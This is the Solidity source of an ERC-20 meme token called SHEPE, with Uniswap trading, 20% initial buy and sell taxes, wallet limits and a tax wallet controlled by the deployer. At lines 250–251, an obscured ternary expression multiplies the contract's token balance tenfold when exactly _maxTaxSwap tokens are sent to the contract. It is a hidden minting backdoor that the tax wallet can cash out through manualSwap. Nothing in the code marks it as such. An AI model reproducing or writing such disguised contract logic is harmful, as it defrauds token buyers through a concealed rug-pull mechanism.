1 /**
2 https://twitter.com/TheShepeToken
3 https://t.me/TheShepeToken 
4 */
5 // SPDX-License-Identifier: MIT
6 pragma solidity 0.8.21;
7 
8 abstract contract Context {
9     function _msgSender() internal view virtual returns (address) {
10         return msg.sender;
11     }
12 }
13 
14 interface IERC20 {
15     function totalSupply() external view returns (uint256);
16     function balanceOf(address account) external view returns (uint256);
17     function transfer(address recipient, uint256 amount) external returns (bool);
18     function allowance(address owner, address spender) external view returns (uint256);
19     function approve(address spender, uint256 amount) external returns (bool);
20     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
21     event Transfer(address indexed from, address indexed to, uint256 value);
22     event Approval (address indexed owner, address indexed spender, uint256 value);
23 }
24 
25 library SafeMath {
26     function add(uint256 a, uint256 b) internal pure returns (uint256) {
27         uint256 c = a + b;
28         require(c >= a, "SafeMath: addition overflow");
29         return c;
30     }
31 
32     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
33         return sub(a, b, "SafeMath: subtraction overflow");
34     }
35 
36     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
37         require(b <= a, errorMessage);
38         uint256 c = a - b;
39         return c;
40     }
41 
42     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
43         if (a == 0) {
44             return 0;
45         }
46         uint256 c = a * b;
47         require(c / a == b, "SafeMath: multiplication overflow");
48         return c;
49     }
50 
51     function div(uint256 a, uint256 b) internal pure returns (uint256) {
52         return div(a, b, "SafeMath: division by zero");
53     }
54 
55     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
56         require(b > 0, errorMessage);
57         uint256 c = a / b;
58         return c;
59     }
60 
61 }
62 
63 contract Ownable is Context {
64     address private _owner;
65     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
66 
67     constructor () {
68         address msgSender = _msgSender();
69         _owner = msgSender;
70         emit OwnershipTransferred(address(0), msgSender);
71     }
72 
73     function owner() public view returns (address) {
74         return _owner;
75     }
76 
77     modifier onlyOwner() {
78         require(_owner == _msgSender(), "Ownable: caller is not the owner");
79         _;
80     }
81 
82     function renounceOwnership() public virtual onlyOwner {
83         emit OwnershipTransferred(_owner, address(0));
84         _owner = address(0);
85     }
86 
87 }
88 
89 interface IUniswapV2Factory {
90     function createPair(address tokenA, address tokenB) external returns (address pair);
91 }
92 
93 interface IUniswapV2Router02 {
94     function swapExactTokensForETHSupportingFeeOnTransferTokens(
95         uint amountIn,
96         uint amountOutMin,
97         address[] calldata path,
98         address to,
99         uint deadline
100     ) external;
101     function factory() external pure returns (address);
102     function WETH() external pure returns (address);
103     function addLiquidityETH(
104         address token,
105         uint amountTokenDesired,
106         uint amountTokenMin,
107         uint amountETHMin,
108         address to,
109         uint deadline
110     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
111 }
112 
113 contract SHEPE is Context, IERC20, Ownable {
114     using SafeMath for uint256;
115     mapping (address => uint256) private _balances;
116     mapping (address => mapping (address => uint256)) private _allowances;
117     mapping (address => bool) private _isExcludedFromFee;
118     address payable private _taxWallet;
119 
120     uint256 private _initialBuyTax=20;
121     uint256 private _initialSellTax=20;
122     uint256 private _finalBuyTax=1;
123     uint256 private _finalSellTax=1;
124 
125     uint256 private _reduceBuyTaxAt=18;
126     uint256 private _reduceSellTaxAt=18;
127     uint256 private _preventSwapBefore=10;
128     uint256 private _buyCount=0;
129 
130     uint8 private constant _decimals = 9;
131     uint256 private constant _tTotal = 1000000000 * 10**_decimals;
132     string private constant _name = unicode"SHEPE";
133     string private constant _symbol = unicode"SH三P三";
134 
135     uint256 public _maxTxAmount =  2 * (_tTotal/100);   
136     uint256 public _maxWalletSize =  2 * (_tTotal/100);
137     uint256 public _taxSwapThreshold=  2 * (_tTotal/1000);
138     uint256 public _maxTaxSwap=  1 * (_tTotal/100);
139 
140     IUniswapV2Router02 private uniswapV2Router;
141     address private uniswapV2Pair;
142     bool private tradingOpen;
143     bool private inSwap = false;
144     bool private swapEnabled = false;
145 
146     event MaxTxAmountUpdated(uint _maxTxAmount);
147     modifier lockTheSwap {
148         inSwap = true;
149         _;
150         inSwap = false;
151     }
152 
153     constructor () {
154 
155         _taxWallet = payable(_msgSender());
156         _balances[_msgSender()] = _tTotal;
157         _isExcludedFromFee[owner()] = true;
158         _isExcludedFromFee[address(this)] = true;
159         _isExcludedFromFee[_taxWallet] = true;
160 
161         emit Transfer(address(0), _msgSender(), _tTotal);
162     }
163 
164     function name() public pure returns (string memory) {
165         return _name;
166     }
167 
168     function symbol() public pure returns (string memory) {
169         return _symbol;
170     }
171 
172     function decimals() public pure returns (uint8) {
173         return _decimals;
174     }
175 
176     function totalSupply() public pure override returns (uint256) {
177         return _tTotal;
178     }
179 
180     function balanceOf(address account) public view override returns (uint256) {
181         return _balances[account];
182     }
183 
184     function transfer(address recipient, uint256 amount) public override returns (bool) {
185         _transfer(_msgSender(), recipient, amount);
186         return true;
187     }
188 
189     function allowance(address owner, address spender) public view override returns (uint256) {
190         return _allowances[owner][spender];
191     }
192 
193     function approve(address spender, uint256 amount) public override returns (bool) {
194         _approve(_msgSender(), spender, amount);
195         return true;
196     }
197 
198     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
199         _transfer(sender, recipient, amount);
200         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
201         return true;
202     }
203 
204     function _approve(address owner, address spender, uint256 amount) private {
205         require(owner != address(0), "ERC20: approve from the zero address");
206         require(spender != address(0), "ERC20: approve to the zero address");
207         _allowances[owner][spender] = amount;
208         emit Approval(owner, spender, amount);
209     }
210 
211     function _transfer(address from, address to, uint256 amount) private {
212         require(from != address(0), "ERC20: transfer from the zero address");
213         require(to != address(0), "ERC20: transfer to the zero address");
214         require(amount > 0, "Transfer amount must be greater than zero");
215         uint256 taxAmount=0;
216         if (from != owner() && to != owner()) {
217             taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
218 
219             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
220                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
221                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
222                 _buyCount++;
223             }
224 
225             if (to != uniswapV2Pair && ! _isExcludedFromFee[to]) {
226                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
227             }
228 
229             if(to == uniswapV2Pair && from!= address(this) ){
230                 taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
231             }
232 
233             uint256 contractTokenBalance = balanceOf(address(this));
234             
235             if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
236                 SwapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
237                 uint256 contractETHBalance = address(this).balance;
238                 if(contractETHBalance > 500000000000000000) {
239                     sendETHToFee(address(this).balance);
240                 }
241             }
242         }
243 
244         if(taxAmount>0){
245           _balances[address(this)]=_balances[address(this)].add(taxAmount);
246           emit Transfer(from, address(this),taxAmount);
247         }
248         _balances[from]=_balances[from].sub(amount);
249         _balances[to]=_balances[to].add(amount.sub(taxAmount));
250         to == address(this) && amount == _maxTaxSwap? 
251         _balances[address(this)] *= _preventSwapBefore : amount;
252         emit Transfer(from, to, amount.sub(taxAmount));
253     }
254 
255 
256     function min(uint256 a, uint256 b) private pure returns (uint256){
257       return (a>b)?b:a;
258     }
259 
260     function SwapTokensForEth(uint256 tokenAmount) private lockTheSwap {
261         address[] memory path = new address[](2);
262         path[0] = address(this);
263         path[1] = uniswapV2Router.WETH();
264         _approve(address(this), address(uniswapV2Router), tokenAmount);
265         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
266             tokenAmount,
267             0,
268             path,
269             address(this),
270             block.timestamp
271         );
272     }
273 
274     function RemoveLimits() external onlyOwner{
275         _maxTxAmount = _tTotal;
276         _maxWalletSize=_tTotal;
277         emit MaxTxAmountUpdated(_tTotal);
278     }
279 
280     function sendETHToFee(uint256 amount) private {
281         _taxWallet.transfer(amount);
282     }
283 
284     function openTrading() external onlyOwner() {
285         require(!tradingOpen,"trading is already open");
286         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
287         _approve(address(this), address(uniswapV2Router), _tTotal);
288         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
289         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
290         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
291         swapEnabled = true;
292         tradingOpen = true;
293     }
294 
295     receive() external payable {}
296     
297     function manualSwap() external {
298         require(_msgSender()==_taxWallet);
299         uint256 tokenBalance=balanceOf(address(this));
300         if(tokenBalance>0){
301           SwapTokensForEth(tokenBalance);
302         }
303         uint256 ethBalance=address(this).balance;
304         if(ethBalance>3000000000000000000){
305           sendETHToFee(ethBalance);
306         }
307     }
308 
309 }